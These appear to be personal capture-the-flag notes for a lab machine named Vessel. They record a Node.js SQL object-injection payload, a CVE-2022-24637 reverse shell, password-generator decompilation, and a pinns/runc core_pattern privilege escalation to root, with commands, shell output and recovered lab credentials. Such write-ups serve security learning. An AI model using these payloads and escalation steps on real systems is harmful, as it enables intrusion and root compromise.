# Vessel

---

## Recon

0. Port 22, 80
1. Found domain name from site when connected to IP all the way to the bottom
2. Found /dev/ dir
3. Assumed there's /.git/ and found
4. git-dumper to get all
5. git whatchanged -> git diff, found sql injection vuln
6. Nodejs SQL Object Injection using BurpSuite: username=admin&password[password]=1
https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/
7. Found subdomain `openwebanalytics.vessel.htb` at the view analytics thing
8. CVE-2022-24637: https://github.com/garySec/CVE-2022-24637/blob/main/exploit.py -> revshell
9. mysql -> got admin password, wasnt needed anyways, but it's there
10. got `passwordGenerator` -> reverse engineer it ->
Decompile the executable using pyinstxtractor to get a .pyc file that cointains the byte code.

Then, use uncompyle6 to decompile passwordGenerator.pyc.
password: `YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS`
Ethan's password: `b@mPRNSVTjjLKId1T` -> user!

11. CVE-2021-3560

first SSH:

runc spec --rootless -> runc --root /tmp/pwn run alpine

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

second SSH:

echo -e '#!/bin/sh\nchmod +s /usr/bin/bash' > /tmp/pwn/e.sh && chmod +x /tmp/pwn/e.sh
pinns -d /var/run -f 844aa3c8-2c60-4245-a7df-9e26768ff303 -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/pwn/e.sh #' --ipc --net --uts --cgroup

back to first:

ulimit -c unlimited
tail -f /dev/null &
ps
    PID TTY          TIME CMD
      1 pts/0    00:00:00 sh
     12 pts/0    00:00:00 tail
     13 pts/0    00:00:00 ps
bash -i
bash: /root/.bashrc: Permission denied
root@runc:/# kill -SIGSEGV 12
root@runc:/# ps
    PID TTY          TIME CMD
      1 pts/0    00:00:00 sh
     14 pts/0    00:00:00 bash
     17 pts/0    00:00:00 ps


back to second:

ethan@vessel:~$ ls -ls /usr/bin/bash
1160 -rwsr-sr-x 1 root root 1183448 Apr 18 09:14 /usr/bin/bash
ethan@vessel:~$ bash -p
bash-5.0# cd /root
bash-5.0# cat root.txt

---

db cred:
db: {
        host     : 'localhost',
        user     : 'default',
        password : 'daqvACHKvRn84VdVp',
        database : 'vessel'
}

mysql> select * from accounts;
select * from accounts;
+----+----------+----------------------------------+------------------+
| id | username | password                         | email            |
+----+----------+----------------------------------+------------------+
|  1 | admin    | k>N4Hf6TmHE(W]Uq"(RCj}V>&=rB$4}< | admin@vessel.htb |
+----+----------+----------------------------------+------------------+
1 row in set (0.00 sec)

find /home 2>/dev/null
/home
/home/steven
/home/steven/passwordGenerator
/home/steven/.bashrc
/home/steven/.notes
/home/steven/.notes/screenshot.png
/home/steven/.notes/notes.pdf
/home/steven/.profile
/home/steven/.bash_logout
/home/steven/.bash_history
/home/ethan


---

## Foothold

